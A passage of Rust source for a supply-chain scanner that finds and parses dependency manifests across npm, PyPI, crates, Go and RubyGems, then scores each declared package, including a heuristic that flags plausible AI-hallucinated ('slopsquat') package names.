//! `tirith ecosystem scan` — supply-chain risk scan of a project's dependency
//! manifests. The directory-level companion to [`crate::package_risk`]: it
//! discovers every dependency a project *declares* and scores each with the
//! same deterministic factor engine (no model, reproducible by hand).
//!
//! It discovers manifests via a bounded walk, parses declared dependencies
//! (parsers never execute the manifest or reach the network), scores each
//! through [`package_risk::score_package`] (with an opt-in `--online`
//! registry pass), and folds in slopsquat detection — see [`slopsquat`].
//!
//! Output is a [`Verdict`] of [`Finding`]s like the detection engine
//! (explainable, audit-loggable, policy-aware), reusing the existing
//! package-supply-chain [`RuleId`]s rather than inventing new ones.
//!
//! Every function is pure and total except the filesystem walk and the
//! opt-in registry fetch; given the same inputs the verdict is reproducible.

use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

use serde::Serialize;

use crate::package_risk::{
    self, ApiSignals, ContentSignals, NameVsPopular, PackageSignals, RiskBreakdown,
};
use crate::threatdb::{Ecosystem, PackageThreatAssessment, ThreatDb};
use crate::verdict::{Action, Evidence, Finding, RuleId, Severity, Timings, Verdict};
use crate::version_intent::VersionIntent;

/// Maximum directory depth the manifest walk descends.
pub const MAX_WALK_DEPTH: usize = 6;

/// Hard cap on directory entries examined during the walk.
pub const MAX_WALK_ENTRIES: usize = 50_000;

/// Hard cap on declared dependencies scored in a single run. Excess is still
/// parsed; scoring stops at the cap and the summary records the truncation.
pub const MAX_DEPENDENCIES: usize = 5_000;

/// Default cap on installed-tree entries (one entry = one installed package
/// directory). Configurable via `--max-installed-entries`; `0` means unbounded.
pub const DEFAULT_MAX_INSTALLED_ENTRIES: usize = 5_000;

/// Directory names never descended into — build output and vendored trees hold
/// installed content, not declared manifests, and would dominate the walk.
const SKIP_DIRS: &[&str] = &[
    "node_modules",
    "target",
    ".git",
    "vendor",
    "site-packages",
    "dist",
    "build",
    ".venv",
    "venv",
    "__pycache__",
    ".tox",
    ".mypy_cache",
    ".cargo",
];

/// A dependency-manifest file format `ecosystem scan` understands.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ManifestKind {
    /// npm `package.json` — `dependencies` + `devDependencies` maps.
    NpmPackageJson,
    /// npm `package-lock.json` — the fully-resolved tree (covers transitives).
    NpmPackageLock,
    /// Python `requirements.txt` — one requirement specifier per line.
    PyRequirementsTxt,
    /// Python `pyproject.toml` — PEP 621 + Poetry dependency tables.
    PyPyprojectToml,
    /// Rust `Cargo.toml` — `[dependencies]` and friends.
    CargoToml,
    /// Go `go.mod` — `require` directives.
    GoMod,
    /// Ruby `Gemfile` — `gem "name"` directives.
    RubyGemfile,
}

impl ManifestKind {
    /// The ecosystem a manifest of this kind declares packages for.
    pub fn ecosystem(self) -> Ecosystem {
        match self {
            ManifestKind::NpmPackageJson | ManifestKind::NpmPackageLock => Ecosystem::Npm,
            ManifestKind::PyRequirementsTxt | ManifestKind::PyPyprojectToml => Ecosystem::PyPI,
            ManifestKind::CargoToml => Ecosystem::Crates,
            ManifestKind::GoMod => Ecosystem::Go,
            ManifestKind::RubyGemfile => Ecosystem::RubyGems,
        }
    }

    /// A stable, human / machine label for the manifest format.
    pub fn label(self) -> &'static str {
        match self {
            ManifestKind::NpmPackageJson => "package.json",
            ManifestKind::NpmPackageLock => "package-lock.json",
            ManifestKind::PyRequirementsTxt => "requirements.txt",
            ManifestKind::PyPyprojectToml => "pyproject.toml",
            ManifestKind::CargoToml => "Cargo.toml",
            ManifestKind::GoMod => "go.mod",
            ManifestKind::RubyGemfile => "Gemfile",
        }
    }

    /// Classify a file name as a known manifest, if it is one.
    /// `requirements.txt` matching is loosened to any `requirements*.txt`.
    pub fn from_file_name(name: &str) -> Option<ManifestKind> {
        match name {
            "package.json" => Some(ManifestKind::NpmPackageJson),
            "package-lock.json" => Some(ManifestKind::NpmPackageLock),
            "pyproject.toml" => Some(ManifestKind::PyPyprojectToml),
            "Cargo.toml" => Some(ManifestKind::CargoToml),
            "go.mod" => Some(ManifestKind::GoMod),
            "Gemfile" => Some(ManifestKind::RubyGemfile),
            other => {
                if other.starts_with("requirements") && other.ends_with(".txt") {
                    Some(ManifestKind::PyRequirementsTxt)
                } else {
                    None
                }
            }
        }
    }
}

/// A discovered manifest file on disk.
#[derive(Debug, Clone)]
pub struct DiscoveredManifest {
    /// Absolute or scan-root-relative path to the manifest file.
    pub path: PathBuf,
    /// Which manifest format it is.
    pub kind: ManifestKind,
}

/// Walk `root` and return every dependency manifest found, bounded by
/// [`MAX_WALK_DEPTH`] and [`MAX_WALK_ENTRIES`]. [`SKIP_DIRS`] are not
/// descended; reads only directory entries, never file content. A file `root`
/// returns that single manifest. Result is sorted by path for determinism.
pub fn discover_manifests(root: &Path) -> Vec<DiscoveredManifest> {
    let mut found: Vec<DiscoveredManifest> = Vec::new();

    // A file root: classify it directly.
    if root.is_file() {
        if let Some(kind) = root
            .file_name()
            .and_then(|n| n.to_str())
            .and_then(ManifestKind::from_file_name)
        {
            found.push(DiscoveredManifest {
                path: root.to_path_buf(),
                kind,
            });
        }
        return found;
    }

    // Iterative walk with an explicit work stack (no recursion, so depth is a
    // hard bound and a deep tree cannot blow the stack). Sorted before return.
    let mut examined = 0usize;
    let mut queue: Vec<(PathBuf, usize)> = vec![(root.to_path_buf(), 0)];
    while let Some((dir, depth)) = queue.pop() {
        let entries = match std::fs::read_dir(&dir) {
            Ok(e) => e,
            Err(_) => continue,
        };
        for entry in entries.flatten() {
            examined += 1;
            if examined > MAX_WALK_ENTRIES {
                found.sort_by(|a, b| a.path.cmp(&b.path));
                return found;
            }
            let path = entry.path();
            let Ok(file_type) = entry.file_type() else {
                continue;
            };
            if file_type.is_dir() {
                let name = entry.file_name();
                let name = name.to_string_lossy();
                if SKIP_DIRS.iter().any(|d| *d == name) {
                    continue;
                }
                if depth < MAX_WALK_DEPTH {
                    queue.push((path, depth + 1));
                }
            } else if file_type.is_file() {
                if let Some(kind) = entry
                    .file_name()
                    .to_str()
                    .and_then(ManifestKind::from_file_name)
                {
                    found.push(DiscoveredManifest { path, kind });
                }
            }
        }
    }

    found.sort_by(|a, b| a.path.cmp(&b.path));
    found
}

/// One dependency a manifest declares.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct DeclaredDependency {
    /// The package name as written in the manifest.
    pub name: String,
    /// The ecosystem the manifest is for.
    #[serde(serialize_with = "serialize_ecosystem")]
    pub ecosystem: Ecosystem,
    /// How the version / version-range was written, when the manifest gives one.
    /// Serializes as the version string (or is omitted when unspecified), so the
    /// JSON shape is unchanged from the prior `Option<String>` field; the typed
    /// form lets the threat assessment tell an exact pin from a range.
    #[serde(
        serialize_with = "serialize_version_intent",
        skip_serializing_if = "version_intent_is_unspecified"
    )]
    pub version: VersionIntent,
    /// Whether the manifest declares this as a development-only dependency.
    pub dev: bool,
}

fn serialize_ecosystem<S: serde::Serializer>(eco: &Ecosystem, s: S) -> Result<S::Ok, S::Error> {
    s.serialize_str(&eco.to_string())
}

/// Serialize a [`VersionIntent`] as the original version string, preserving the
/// JSON shape of the former `version: Option<String>` field. `Unspecified` is
/// skipped via [`version_intent_is_unspecified`], so this only runs for the
/// other variants (which all have a string form).
fn serialize_version_intent<S: serde::Serializer>(
    intent: &VersionIntent,
    s: S,
) -> Result<S::Ok, S::Error> {
    match intent.as_version_str() {
        Some(v) => s.serialize_str(v),
        // Unreachable in practice (Unspecified is skipped), but serialize a unit
        // rather than panic if the skip predicate is ever bypassed.
        None => s.serialize_none(),
    }
}

/// Skip predicate matching the old `Option::is_none`: omit the field only when
/// no version was given.
fn version_intent_is_unspecified(intent: &VersionIntent) -> bool {
    matches!(intent, VersionIntent::Unspecified)
}

/// Parse a manifest's text into the dependencies it declares. Total, never
/// panics. `Some(deps)` (possibly empty) means it parsed; `None` means the
/// manifest is malformed (a structured JSON/TOML that could not be parsed).
/// Line-based formats have no malformed state and always return `Some`.
pub fn parse_manifest(kind: ManifestKind, text: &str) -> Option<Vec<DeclaredDependency>> {
    match kind {
        ManifestKind::NpmPackageJson => parse_package_json(text),
        ManifestKind::NpmPackageLock => parse_package_lock(text),
        ManifestKind::PyRequirementsTxt => Some(parse_requirements_txt(text)),
        ManifestKind::PyPyprojectToml => parse_pyproject_toml(text),
        ManifestKind::CargoToml => parse_cargo_toml(text),
        ManifestKind::GoMod => Some(parse_go_mod(text)),
        ManifestKind::RubyGemfile => Some(parse_gemfile(text)),
    }
}

/// npm `package.json`: `dependencies`, `devDependencies`, `optionalDependencies`,
/// `peerDependencies`. `devDependencies` are tagged `dev = true`. `None` on
/// invalid JSON.
fn parse_package_json(text: &str) -> Option<Vec<DeclaredDependency>> {
    let json = serde_json::from_str::<serde_json::Value>(text).ok()?;
    let mut out = Vec::new();
    for (field, dev) in [
        ("dependencies", false),
        ("optionalDependencies", false),
        ("peerDependencies", false),
        ("devDependencies", true),
    ] {
        if let Some(map) = json.get(field).and_then(|v| v.as_object()) {
            for (name, ver) in map {
                let name = name.trim();
                if name.is_empty() {
                    continue;
                }
                let version = match ver.as_str().filter(|s| !s.is_empty()) {
                    // package.json declares a semver range/version (not fully
                    // parsed for npm). A full bare version (`1.2.3`) is an exact
                    // pin; a PARTIAL bare version (`1`, `1.2`) is an X-range, not
                    // a too-narrow exact; explicit ranges stay unresolved.
                    Some(v) => npm_manifest_intent(v),
                    None => VersionIntent::Unspecified,
                };
                out.push(DeclaredDependency {
                    name: name.to_string(),
                    ecosystem: Ecosystem::Npm,
                    version,
                    dev,
                });
            }
        }
    }
    Some(out)
}

/// Classify an npm `package.json` version requirement. node-semver treats a full
/// bare version (`1.2.3`) as an exact pin but a PARTIAL bare version as an X-range
/// (`1` == `1.x.x`, `1.2` == `1.2.x`); explicit operators stay unresolved. This
/// keeps a partial spec from being mistaken for a too-narrow exact match.
fn npm_manifest_intent(spec: &str) -> VersionIntent {
    match VersionIntent::from_explicit_version(spec) {
        VersionIntent::Exact(v) => match npm_partial_xrange(&v) {
            Some(range) => VersionIntent::from_pep440_specifier(&range),
            None => VersionIntent::Exact(v),
        },
        other => other,
    }
}

/// Map an npm PARTIAL version (`1`, `1.2`) to an explicit `>=lo,<hi` X-range, or
/// `None` for a full `x.y.z` version (an exact pin) or any prerelease/build tail.
fn npm_partial_xrange(v: &str) -> Option<String> {
    if v.contains('-') || v.contains('+') {
        return None;
    }
    let body = v.strip_prefix(['v', 'V']).unwrap_or(v);
    let nums: Vec<u64> = body
        .split('.')
        .map(|s| s.parse::<u64>().ok())
        .collect::<Option<_>>()?;
    match nums.as_slice() {
        [major] => Some(format!(">={major}.0.0,<{}.0.0", major + 1)),
        [major, minor] => Some(format!(">={major}.{minor}.0,<{major}.{}.0", minor + 1)),
        _ => None,
    }
}

/// npm `package-lock.json`: the fully-resolved tree. v2/v3 keys `packages` by
/// install path; v1 keys `dependencies` by name. Both are read to cover the
/// transitive closure.
fn parse_package_lock(text: &str) -> Option<Vec<DeclaredDependency>> {
    let json = serde_json::from_str::<serde_json::Value>(text).ok()?;
    let mut seen: BTreeSet<(String, Option<String>)> = BTreeSet::new();
    let mut out = Vec::new();

    // lockfile v2 / v3 — `packages` keyed by install path.
    if let Some(packages) = json.get("packages").and_then(|v| v.as_object()) {
        for (path_key, meta) in packages {
            // The root package is keyed by the empty string — skip it.
            let Some(name) = package_lock_name_from_path(path_key) else {
                continue;
            };
            let version = meta
                .get("version")
                .and_then(|v| v.as_str())
                .map(str::to_string);
            let dev = meta.get("dev").and_then(|v| v.as_bool()).unwrap_or(false);
            if seen.insert((name.clone(), version.clone())) {
                out.push(DeclaredDependency {
                    name,
                    ecosystem: Ecosystem::Npm,
                    // A lockfile pins a concrete resolved version.
                    version: lock_version_intent(version),
                    dev,
                });
            }
        }
    }

    // lockfile v1 — `dependencies` keyed by name (recursively nested).
    if let Some(deps) = json.get("dependencies").and_then(|v| v.as_object()) {
        collect_lock_v1_deps(deps, &mut seen, &mut out);
    }

    Some(out)
}

/// Map a lockfile's resolved version string to a [`VersionIntent`]. A lockfile
/// pins one concrete version, so a present value is `Resolved`; an absent one is
/// `Unspecified`.
fn lock_version_intent(version: Option<String>) -> VersionIntent {
    match version {
        Some(v) => VersionIntent::Resolved(v),
        None => VersionIntent::Unspecified,
    }
}

/// Extract the package name from a `package-lock.json` v2/v3 path key — the
/// segment after the LAST `node_modules/`. The empty (root) key yields `None`.
fn package_lock_name_from_path(path_key: &str) -> Option<String> {
    if path_key.is_empty() {
        return None;
    }
    let tail = match path_key.rsplit_once("node_modules/") {
        Some((_, tail)) => tail,
        None => path_key,
    };
    let tail = tail.trim_matches('/');
    if tail.is_empty() {
        return None;
    }
    Some(tail.to_string())
}

/// Recursively collect a lockfile-v1 `dependencies` tree.
fn collect_lock_v1_deps(
    deps: &serde_json::Map<String, serde_json::Value>,
    seen: &mut BTreeSet<(String, Option<String>)>,
    out: &mut Vec<DeclaredDependency>,
) {
    for (name, meta) in deps {
        let name = name.trim();
        if name.is_empty() {
            continue;
        }
        let version = meta
            .get("version")
            .and_then(|v| v.as_str())
            .map(str::to_string);
        let dev = meta.get("dev").and_then(|v| v.as_bool()).unwrap_or(false);
        if seen.insert((name.to_string(), version.clone())) {
            out.push(DeclaredDependency {
                name: name.to_string(),
                ecosystem: Ecosystem::Npm,
                // A lockfile pins a concrete resolved version.
                version: lock_version_intent(version),
                dev,
            });
        }
        if let Some(nested) = meta.get("dependencies").and_then(|v| v.as_object()) {
            collect_lock_v1_deps(nested, seen, out);
        }
    }
}

/// Python `requirements.txt`: one PEP 508 specifier per line. Comments, blank
/// lines, and pip option lines (`-r`, `--index-url`, `-e`, …) are skipped; the
/// bare distribution name is extracted.
fn parse_requirements_txt(text: &str) -> Vec<DeclaredDependency> {
    let mut out = Vec::new();
    for raw_line in text.lines() {
        // Strip an inline comment, then trim.
        let line = match raw_line.split_once(" #") {
            Some((before, _)) => before,
            None => raw_line,
        };
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        // pip directive lines (`-r other.txt`, `--index-url ...`, `-e .`).
        if line.starts_with('-') {
            continue;
        }
        // A bare URL / VCS install (`git+https://…`) has no PyPI name to score.
        if line.contains("://") {
            continue;
        }
        if let Some(name) = python_requirement_name(line) {
            out.push(DeclaredDependency {
                name,
                ecosystem: Ecosystem::PyPI,
                // Capture the PEP 508 version specifier so a real pin (`==1.4.0`)
                // is assessed (Exact/Constraint) instead of degrading to a
                // spurious "unresolved" warning; a bare name stays Unspecified.
                version: VersionIntent::from_pep440_specifier(&python_requirement_spec(line)),
                dev: false,
            });
        }
    }
    out
}

/// Extract the bare distribution name from a PEP 508 requirement line,
/// cutting at the first version operator, extras bracket, env-marker, or space.
fn python_requirement_name(line: &str) -> Option<String> {
    let name_end = line
        .find(|c: char| {
            matches!(
                c,
                '=' | '<' | '>' | '!' | '~' | '[' | ';' | ' ' | '\t' | '@' | '('
            )
        })
        .unwrap_or(line.len());
    let name = line[..name_end].trim();
    if name.is_empty() || !is_plausible_package_name(name) {
        None
    } else {
        Some(name.to_string())
    }
}

/// Extract the version specifier from a PEP 508 requirement line: the part after
/// the name and optional `[extras]`, before any `;` environment marker. Returns an
/// empty string for a bare name (which `from_pep440_specifier` maps to Unspecified).
fn python_requirement_spec(line: &str) -> String {
    // Drop the environment marker, then any `[extras]` so neither is mistaken for a
    // specifier; the specifier starts at the first comparison operator.
    let before_marker = line.split(';').next().unwrap_or(line);
    let mut buf = String::with_capacity(before_marker.len());
    let mut depth = 0u32;
    for c in before_marker.chars() {
        match c {
            '[' => depth += 1,
            ']' => depth = depth.saturating_sub(1),
            _ if depth == 0 => buf.push(c),
            _ => {}
        }
    }
    match buf.find(['=', '<', '>', '!', '~']) {
        Some(i) => buf[i..].trim().to_string(),
        None => String::new(),
    }
}

/// Python `pyproject.toml`: PEP 621 `[project].dependencies` /
/// `[project.optional-dependencies]`, plus Poetry's
/// `[tool.poetry.dependencies]` / `[tool.poetry.group.*.dependencies]`.
fn parse_pyproject_toml(text: &str) -> Option<Vec<DeclaredDependency>> {
    let doc = toml::from_str::<toml::Value>(text).ok()?;
    let mut out = Vec::new();
    let mut seen: BTreeSet<String> = BTreeSet::new();

    let mut push =
        |name: &str, version: VersionIntent, dev: bool, out: &mut Vec<DeclaredDependency>| {
            let name = name.trim();
            if name.is_empty() || !is_plausible_package_name(name) {
                return;
            }
            // `python` is the interpreter constraint in Poetry tables, not a dep.
            if name.eq_ignore_ascii_case("python") {
                return;
            }
            if seen.insert(name.to_lowercase()) {
                out.push(DeclaredDependency {
                    name: name.to_string(),
                    ecosystem: Ecosystem::PyPI,
                    version,
                    dev,
                });
            }
        };

    // PEP 621 `[project].dependencies` — an array of requirement strings.
    if let Some(deps) = doc
        .get("project")
        .and_then(|p| p.get("dependencies"))
        .and_then(|d| d.as_array())
    {
        for item in deps {
            if let Some(req) = item.as_str() {
                if let Some(name) = python_requirement_name(req) {
                    let version =
                        VersionIntent::from_pep440_specifier(&python_requirement_spec(req));
                    push(&name, version, false, &mut out);
                }
            }
        }
    }
    // PEP 621 `[project.optional-dependencies]` — a table of named arrays.
    if let Some(groups) = doc
        .get("project")
        .and_then(|p| p.get("optional-dependencies"))
        .and_then(|d| d.as_table())
    {
        for arr in groups.values() {
            if let Some(items) = arr.as_array() {
                for item in items {
                    if let Some(req) = item.as_str() {
                        if let Some(name) = python_requirement_name(req) {
                            let version =
                                VersionIntent::from_pep440_specifier(&python_requirement_spec(req));
                            push(&name, version, true, &mut out);
                        }
                    }
                }
            }
        }
    }

    // Poetry `[tool.poetry.dependencies]` — a table keyed by name.
    let poetry = doc.get("tool").and_then(|t| t.get("poetry"));
    if let Some(deps) = poetry
        .and_then(|p| p.get("dependencies"))
        .and_then(|d| d.as_table())
    {
        for name in deps.keys() {
            // Poetry value specs (`^2.0`, `{ version = "^2.0" }`) are not modeled;
            // keep the name with an Unspecified intent.
            push(name, VersionIntent::Unspecified, false, &mut out);
        }
    }
    // Poetry dev groups + legacy `[tool.poetry.dev-dependencies]`.
    if let Some(groups) = poetry
        .and_then(|p| p.get("group"))
        .and_then(|g| g.as_table())
    {
        for group in groups.values() {
            if let Some(deps) = group.get("dependencies").and_then(|d| d.as_table()) {
                for name in deps.keys() {
                    push(name, VersionIntent::Unspecified, true, &mut out);
                }
            }
        }
    }
    if let Some(deps) = poetry
        .and_then(|p| p.get("dev-dependencies"))
        .and_then(|d| d.as_table())
    {
        for name in deps.keys() {
            push(name, VersionIntent::Unspecified, true, &mut out);
        }
    }

    Some(out)
}

/// Rust `Cargo.toml`: `[dependencies]`, `[build-dependencies]`,
/// `[dev-dependencies]`, and the same three under any `[target.*]` table.
fn parse_cargo_toml(text: &str) -> Option<Vec<DeclaredDependency>> {
    let doc = toml::from_str::<toml::Value>(text).ok()?;
    let mut out = Vec::new();
    let mut seen: BTreeSet<String> = BTreeSet::new();

    let mut collect =
        |table: Option<&toml::Value>, dev: bool, out: &mut Vec<DeclaredDependency>| {
            let Some(table) = table.and_then(|t| t.as_table()) else {
                return;
            };
            for (name, spec) in table {
                let name = name.trim();
                if name.is_empty() || !is_plausible_package_name(name) {
                    continue;
                }
                // A `package = "real-name"` rename: score the real crate name.
                let real_name = spec
                    .as_table()
                    .and_then(|t| t.get("package"))
                    .and_then(|p| p.as_str())
                    .unwrap_or(name);
                if !is_plausible_package_name(real_name) {
                    continue;
                }
                let version = spec.as_str().map(str::to_string).or_else(|| {
                    spec.as_table()
                        .and_then(|t| t.get("version"))
                        .and_then(|v| v.as_str())
                        .map(str::to_string)
                });
                if seen.insert(real_name.to_string()) {
                    out.push(DeclaredDependency {
                        name: real_name.to_string(),
                        ecosystem: Ecosystem::Crates,
                        // Cargo semver requirement: not parsed; plain is exact,
                        // a range stays unresolved.
                        version: version
                            .map(|v| VersionIntent::from_explicit_version(&v))
                            .unwrap_or(VersionIntent::Unspecified),
                        dev,
                    });
                }
            }
        };

    collect(doc.get("dependencies"), false, &mut out);
    collect(doc.get("build-dependencies"), false, &mut out);
    collect(doc.get("dev-dependencies"), true, &mut out);

    // `[target.<cfg>.dependencies]` and friends.
    if let Some(targets) = doc.get("target").and_then(|t| t.as_table()) {
        for target in targets.values() {
            collect(target.get("dependencies"), false, &mut out);
            collect(target.get("build-dependencies"), false, &mut out);
            collect(target.get("dev-dependencies"), true, &mut out);
        }
    }

    Some(out)
}

/// Go `go.mod`: `require` directives, both single-line and block form. The
/// module path is taken as the package name.
fn parse_go_mod(text: &str) -> Vec<DeclaredDependency> {
    let mut out = Vec::new();
    let mut seen: BTreeSet<String> = BTreeSet::new();
    let mut in_require_block = false;

    for raw in text.lines() {
        // Strip a trailing `// comment`.
        let line = match raw.split_once("//") {
            Some((before, _)) => before,
            None => raw,
        };
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        if in_require_block {
            if line == ")" {
                in_require_block = false;
                continue;
            }
            if let Some(dep) = go_mod_require_entry(line) {
                if seen.insert(dep.name.clone()) {
                    out.push(dep);
                }
            }
            continue;
        }
        if line == "require (" || line.starts_with("require (") {
            in_require_block = true;
            continue;
        }
        if let Some(rest) = line.strip_prefix("require ") {
            if let Some(dep) = go_mod_require_entry(rest.trim()) {
                if seen.insert(dep.name.clone()) {
                    out.push(dep);
                }
            }
        }
    }
    out
}

/// Parse one `go.mod` require entry (`module version`); the caller already
/// stripped any trailing `// indirect` comment.
fn go_mod_require_entry(entry: &str) -> Option<DeclaredDependency> {
    let mut parts = entry.split_whitespace();
    let module = parts.next()?;
    if module.is_empty() || module == "(" {
        return None;
    }
    let version = parts.next().map(str::to_string);
    Some(DeclaredDependency {
        name: module.to_string(),
        ecosystem: Ecosystem::Go,
        // go.mod pins a concrete module version (e.g. `v1.2.3`).
        version: version
            .map(|v| VersionIntent::from_explicit_version(&v))
            .unwrap_or(VersionIntent::Unspecified),
        dev: false,
    })
}

/// Ruby `Gemfile`: `gem "name"` directives. A gem inside a `group :development`
/// / `:test` block is tagged `dev = true`.
fn parse_gemfile(text: &str) -> Vec<DeclaredDependency> {
    let mut out = Vec::new();
    let mut seen: BTreeSet<String> = BTreeSet::new();
    // Stack of open `… do` blocks; bool = is-dev-group. EVERY do/end is tracked
    // (not only `group`) so a nested non-dev block closing inside a dev group
    // does not wrongly clear the dev tag.
    let mut block_stack: Vec<bool> = Vec::new();

    for raw in text.lines() {
        // Strip a `#` comment.
        let line = match raw.split_once('#') {
            Some((before, _)) => before,
            None => raw,
        };
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        if line == "end" {
            block_stack.pop();
            continue;
        }
        if line.ends_with(" do") || line == "do" {
            let is_dev_group = line.strip_prefix("group ").is_some_and(|rest| {
                let lower = rest.to_lowercase();
                lower.contains("development") || lower.contains("test")
            });
            block_stack.push(is_dev_group);
            continue;
        }
        if let Some(name) = gemfile_gem_name(line) {
            if seen.insert(name.clone()) {
                out.push(DeclaredDependency {
                    name,
                    ecosystem: Ecosystem::RubyGems,
                    // Gemfile parsing keeps only the name today.
                    version: VersionIntent::Unspecified,
                    dev: block_stack.iter().any(|&is_dev| is_dev),
                });
            }
        }
    }
    out
}

/// Extract the gem name from a `gem "name", ...` Gemfile line.
fn gemfile_gem_name(line: &str) -> Option<String> {
    let rest = line.strip_prefix("gem ")?.trim_start();
    let (quote, after) = match rest.chars().next()? {
        '"' => ('"', &rest[1..]),
        '\'' => ('\'', &rest[1..]),
        _ => return None,
    };
    let name = after.split(quote).next()?.trim();
    if name.is_empty() || !is_plausible_package_name(name) {
        None
    } else {
        Some(name.to_string())
    }
}

/// `true` when `name` is shaped like a real package name. Deliberately
/// permissive — it rejects only clearly-not-a-name strings.
fn is_plausible_package_name(name: &str) -> bool {
    if name.is_empty() || name.len() > 214 {
        return false;
    }
    // ASCII alphanumerics plus the separators ecosystems allow (scopes and Go
    // module paths legitimately contain `/`).
    name.chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '@' | '/' | '+'))
}

/// The deterministic slopsquat verdict for one dependency.
///
/// *Slopsquatting* is a plausible-but-fake package name an LLM is likely to
/// hallucinate. This is advisory, not confirmed-malicious, so it is
/// conservative: it fires only when a name is unknown to the threat DB AND
/// looks AI-hallucinated AND sits near a real popular name.
///
/// The enum makes the two valid states the only representable ones:
/// `Suspicious` always carries its reasons and anchor, so [`findings_for`]
/// needs no fallback for a missing anchor.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SlopsquatAssessment {
    /// The dependency is not slopsquat-suspicious.
    Clear,
    /// The dependency is slopsquat-suspicious.
    Suspicious {
        /// Inspectable, plain-language reasons the heuristic fired; non-empty.
        reasons: Vec<String>,
        /// The real popular package the suspicious name sits near (always present).
        near_popular: String,
    },
}

impl SlopsquatAssessment {
    /// The not-suspicious verdict.
    fn clear() -> Self {
        SlopsquatAssessment::Clear
    }

    /// `true` when the dependency is slopsquat-suspicious.
    pub fn is_suspicious(&self) -> bool {
        matches!(self, SlopsquatAssessment::Suspicious { .. })
    }
}

// Hand-written `Serialize` preserves the pre-enum `--format json` shape:
// `{"suspicious": bool, "reasons": [...], "near_popular": "…"}` (the last only
// when suspicious), so a report consumer sees no change.
impl Serialize for SlopsquatAssessment {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        use serde::ser::SerializeStruct;
        match self {
            SlopsquatAssessment::Clear => {
                let mut st = serializer.serialize_struct("SlopsquatAssessment", 2)?;
                st.serialize_field("suspicious", &false)?;
                st.serialize_field("reasons", &Vec::<String>::new())?;
                st.end()
            }
            SlopsquatAssessment::Suspicious {
                reasons,
                near_popular,
            } => {
                let mut st = serializer.serialize_struct("SlopsquatAssessment", 3)?;
                st.serialize_field("suspicious", &true)?;
                st.serialize_field("reasons", reasons)?;
                st.serialize_field("near_popular", near_popular)?;
                st.end()
            }
        }
    }
}

/// Common English words an LLM strings together when hallucinating a
/// descriptive-but-fake package name (`aws-helper-utils`, `data-parser-tool`).
/// A name built mostly from these generic words — and unknown to the threat
/// DB — has the textbook slopsquat shape.
const HALLUCINATION_FILLER_WORDS: &[&str] = &[
    "helper",
    "helpers",
    "utils",
    "util",
    "utility",
    "utilities",
    "tool",
    "tools",
    "toolkit",
    "lib",
    "libs",
    "library",
    "core",
    "common",
    "shared",
    "client",
    "sdk",
    "api",
    "wrapper",
    "manager",
    "handler",
    "parser",
    "builder",
    "factory",
    "service",
    "services",
    "provider",
    "adapter",
    "connector",
    "plugin",
    "module",
    "framework",
    "engine",
    "kit",
    "starter",
    "boot",
    "easy",
    "simple",
    "fast",
    "smart",
    "auto",
    "pro",
    "plus",
    "extended",
    "enhanced",
    "advanced",
    "modern",
    "official",
    "secure",
    "async",
    "data",
    "json",
    "http",
    "rest",
    "config",
];

/// Ecosystem-language prefixes an LLM tacks onto a hallucinated name
/// (`python-requests-helper`, `node-fetch-utils`, `go-redis-client`).
const HALLUCINATION_LANG_PREFIXES: &[&str] = &[
    "python", "py", "node", "js", "nodejs", "go", "golang", "rust", "ruby", "rb", "java",
];

/// Assess whether a declared dependency is slopsquat-suspicious. Pure and
/// total; the DB is consulted read-only (no network/filesystem).
///
/// All three layers required:
/// 1. Unknown to the threat DB (known-popular / confirmed-typosquat names are
///    handled by their own stronger findings).
/// 2. AI-hallucinated name shape (see [`hallucinated_name_shape`]).
/// 3. Near a real popular name — one edit away, or embedding a popular name as
///    a `-`/`_` token (the `<popular>-helper` shape).
pub fn slopsquat(
    name: &str,
    name_vs_popular: &NameVsPopular,
    db: Option<&ThreatDb>,
    ecosystem: Ecosystem,
) -> SlopsquatAssessment {
    // Layer 1 — must be unknown (known-popular / confirmed-typosquat names are
    // real or covered elsewhere).
    match name_vs_popular {
        NameVsPopular::KnownPopular => return SlopsquatAssessment::clear(),
        NameVsPopular::NearPopular { .. } | NameVsPopular::Unknown => {}
    }

    let mut reasons: Vec<String> = Vec::new();

    // Layer 2 — does the NAME look AI-hallucinated?
    let shape = hallucinated_name_shape(name);
    if let Some(reason) = &shape {
        reasons.push(reason.clone());
    }

    // Layer 3 — is it NEAR a real popular name?
    let mut near_popular: Option<String> = None;
    if let NameVsPopular::NearPopular { popular_name, .. } = name_vs_popular {
        near_popular = Some(popular_name.clone());
        reasons.push(format!(
            "the name is one edit from the real popular package '{popular_name}'"
        ));
    } else if let Some(token_hit) = popular_token_in_name(name, db, ecosystem) {
        reasons.push(format!(
            "the name embeds the real popular package '{token_hit}' as a word — \
             the shape of a hallucinated companion package"
        ));
        near_popular = Some(token_hit);
    }

    // Fire only when BOTH a hallucinated shape AND a near-popular anchor are
    // present — either alone is too weak (keeps false positives low). When both
    // hold, `near_popular` is `Some` by construction.
    match (shape.is_some(), near_popular) {
        (true, Some(near_popular)) => SlopsquatAssessment::Suspicious {
            reasons,
            near_popular,
        },
        _ => SlopsquatAssessment::Clear,
    }
}

/// If `name` is shaped like an AI-hallucinated package name, return a
/// plain-language reason; otherwise `None`. Three recognised shapes: a
/// language prefix on a descriptive name, mostly-filler-word tokens, or an
/// unusually long multi-segment name (4+ tokens).
fn hallucinated_name_shape(name: &str) -> Option<String> {
    let lower = name.to_lowercase();
    // Tokenize on package-name separators, dropping any scope.
    let bare = lower.rsplit('/').next().unwrap_or(&lower);
    let tokens: Vec<&str> = bare
        .split(['-', '_', '.'])
        .filter(|t| !t.is_empty())
        .collect();
    if tokens.len() < 2 {
        // A single-token name is not a composed, descriptive shape.
        return None;
    }

    let filler_count = tokens
        .iter()
        .filter(|t| HALLUCINATION_FILLER_WORDS.contains(t))
        .count();
    let lang_prefix = tokens
        .first()
        .map(|t| HALLUCINATION_LANG_PREFIXES.contains(t))
        .unwrap_or(false);

    // Shape A — a language prefix on a multi-token descriptive name.
    if lang_prefix && tokens.len() >= 3 {
        return Some(format!(
